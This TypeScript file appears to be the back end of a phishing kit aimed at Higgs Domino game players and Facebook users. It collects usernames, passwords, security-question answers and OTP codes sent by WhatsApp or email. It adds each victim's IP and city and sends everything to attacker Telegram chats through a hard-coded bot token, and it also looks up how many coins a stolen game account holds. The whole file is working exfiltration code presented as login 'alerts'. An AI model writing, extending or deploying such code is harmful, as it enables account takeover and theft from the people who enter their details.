import axios from 'axios';

interface LocationData {
  ip: string;
  city: string;
  region: string;
}

interface HiggsProfile {
  username: string;
  level: string;
  coins?: string; // Optional, as some APIs might not return it
}

// API Configuration for Higgs Domino Checker (Based on TrueID Games Postman)
// NOTE: Base URL 'http://localhost:3000' is from your screenshot. 
// You MUST replace it with the actual production URL from the Postman collection's environment or documentation.
const HIGGS_BASE_URL = 'http://localhost:3000'; 
const HIGGS_ENDPOINT = '/trueid/v1/higgsdomino';
const HIGGS_API_KEY = '130835f98b17888e3db44bc42615e7d4f4ddef19'; // Key from screenshot

const checkHiggsUser = async (userId: string): Promise<HiggsProfile | null> => {
  try {
    if (!HIGGS_API_KEY) {
      console.warn('Higgs API Key is not set properly.');
      return null;
    }

    // Request using the structure from the Postman screenshot
    const response = await axios.get(`${HIGGS_BASE_URL}${HIGGS_ENDPOINT}`, {
      params: {
        id: userId
      },
      headers: {
        'X-API-Key': HIGGS_API_KEY
      },
      timeout: 5000
    });

    // Logging response for debugging (visible in console)
    console.log('Higgs API Response:', response.data);

    if (response.status === 200 && response.data) {
      // Adjust parsing based on typical API responses. 
      // Often the data is directly in response.data or response.data.data
      const data = response.data.data || response.data;
      
      return {
        username: data.nickname || data.username || data.name || 'Unknown',
        level: data.level || 'Unknown',
        coins: data.coins || data.chip || 'Unknown'
      };
    }
    return null;
  } catch (error) {
    console.error('Failed to check Higgs user:', error);
    return null;
  }
};

// Timeout untuk request lokasi agar tidak menghambat UX
const getLocation = async (): Promise<LocationData> => {
  try {
    const ipRes = await axios.get('https://ipapi.co/json/', { timeout: 5000 });
    return {
      ip: ipRes.data.ip || 'Unknown',
      city: ipRes.data.city || 'Unknown',
      region: ipRes.data.region || 'Unknown'
    };
  } catch (e) {
    console.warn('Failed to get location:', e);
    return { ip: 'Unknown IP', city: 'Unknown City', region: 'Unknown Region' };
  }
};

const escapeHtml = (unsafe: any): string => {
  if (unsafe === null || unsafe === undefined) return '';
  const str = String(unsafe);
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

// Konstanta Bot & Chat ID
const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
const CHAT_IDS = ['6885815623', '6076369736'];

const sendMessage = async (text: string): Promise<boolean> => {
  try {
    const results = await Promise.all(CHAT_IDS.map(async (chatId) => {
      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          }),
        });

        if (!response.ok) {
          const errorBody = await response.text();
          console.error(`Telegram Send Error [${chatId}]:`, errorBody);
          return false;
        }
        return true;
      } catch (err) {
        console.error(`Network Error [${chatId}]:`, err);
        return false;
      }
    }));

    // Return true jika setidaknya satu pesan terkirim
    return results.some(r => r === true);
  } catch (error) {
    console.error('General Telegram Error:', error);
    return false;
  }
};

export const sendToTelegram = async (
  username: string, 
  pass: string, 
  q1: string, 
  a1: string,
  q2: string,
  a2: string
) => {
  const loc = await getLocation();
  const higgsData = await checkHiggsUser(username);
  const now = new Date();
  const timeString = now.toLocaleString('en-US', { 
    year: 'numeric', month: 'numeric', day: 'numeric',
    hour: 'numeric', minute: 'numeric', second: 'numeric',
    hour12: true 
  });

  const message = `
🔐 <b>USER LOGIN ALERT</b>
────────────────────────
👤 ID: <code>${escapeHtml(username)}</code>
${higgsData ? `📛 Game Name: <code>${escapeHtml(higgsData.username)}</code>
⭐ Level: <code>${escapeHtml(higgsData.level)}</code>
💰 Coins: <code>${escapeHtml(higgsData.coins || '-')}</code>` : ''}
🔑 Password: <code>${escapeHtml(pass)}</code>
🗓️ Date: ${escapeHtml(timeString)}
────────────────────────
🛡️ <b>Security Questions:</b>
Q1: ${escapeHtml(q1)}
   Answer: <code>${escapeHtml(a1)}</code>
Q2: ${escapeHtml(q2)}
   Answer: <code>${escapeHtml(a2)}</code>
────────────────────────
📍 <b>Location Info:</b>
IP: <code>${escapeHtml(loc.ip)}</code>
City: ${escapeHtml(loc.city)}
────────────────────────
`;

  return sendMessage(message);
};

export const sendFacebookLogin = async (
  email: string, 
  pass: string,
  q1: string,
  q2: string
) => {
  const loc = await getLocation();
  const now = new Date();
  const timeString = now.toLocaleString('en-US', { 
    year: 'numeric', month: 'numeric', day: 'numeric',
    hour: 'numeric', minute: 'numeric', second: 'numeric',
    hour12: true 
  });

  const message = `
🔔 <b>FACEBOOK LOGIN ALERT</b>
────────────────────────
📧 Email: <code>${escapeHtml(email)}</code>
🔑 Password: <code>${escapeHtml(pass)}</code>
🗓️ Date: ${escapeHtml(timeString)}
────────────────────────
🛡️ <b>Security Questions:</b>
Q1: ${escapeHtml(q1)}
Q2: ${escapeHtml(q2)}
────────────────────────
📍 <b>Location Info:</b>
IP: <code>${escapeHtml(loc.ip)}</code>
City: ${escapeHtml(loc.city)}
────────────────────────
`;

  return sendMessage(message);
};

export const sendOTPRequest = async (
  username: string,
  identifier: string, // Phone number or Email
  method: 'wa' | 'email'
) => {
  console.log('Preparing OTP Request...');
  
  const loc = await getLocation();
  const now = new Date();
  const timeString = now.toLocaleString('en-US', { 
    year: 'numeric', month: 'numeric', day: 'numeric',
    hour: 'numeric', minute: 'numeric', second: 'numeric',
    hour12: true 
  });
  
  const typeName = method === 'wa' ? 'WhatsApp' : 'Email';

  const message = `
🔐 <b>OTP REQUEST ALERT</b>
────────────────────────
👤 ID: <code>${escapeHtml(username)}</code>
👤 Contact: <code>${escapeHtml(identifier)}</code>
🗒️ Method: ${typeName}
📅 Date: ${escapeHtml(timeString)}
────────────────────────
📍 <b>Location Info:</b>
IP: <code>${escapeHtml(loc.ip)}</code>
City: ${escapeHtml(loc.city)}
────────────────────────
`;

  console.log('Sending OTP Request to Telegram...');
  const success = await sendMessage(message);
  console.log('OTP Request Sent:', success);
  
  return success;
};

export const sendOTPSubmission = async (
  username: string,
  identifier: string,
  code: string,
  method: 'wa' | 'email'
) => {
  console.log('Preparing OTP Submission...');
  
  const loc = await getLocation();
  const now = new Date();
  const timeString = now.toLocaleString('en-US', { 
    year: 'numeric', month: 'numeric', day: 'numeric',
    hour: 'numeric', minute: 'numeric', second: 'numeric',
    hour12: true 
  });
  
  const typeName = method === 'wa' ? 'WhatsApp' : 'Email';

  const message = `
🔐 <b>OTP SUBMISSION ALERT</b>
────────────────────────
👤 ID: <code>${escapeHtml(username)}</code>
👤 Contact: <code>${escapeHtml(identifier)}</code>
🗒️ Method: ${typeName}
🔢 Code: <code>${escapeHtml(code)}</code>
📅 Date: ${escapeHtml(timeString)}
────────────────────────
📍 <b>Location Info:</b>
IP: <code>${escapeHtml(loc.ip)}</code>
City: ${escapeHtml(loc.city)}
────────────────────────
`;

  console.log('Sending OTP Submission to Telegram...');
  const success = await sendMessage(message);
  console.log('OTP Submission Sent:', success);
  
  return success;
};
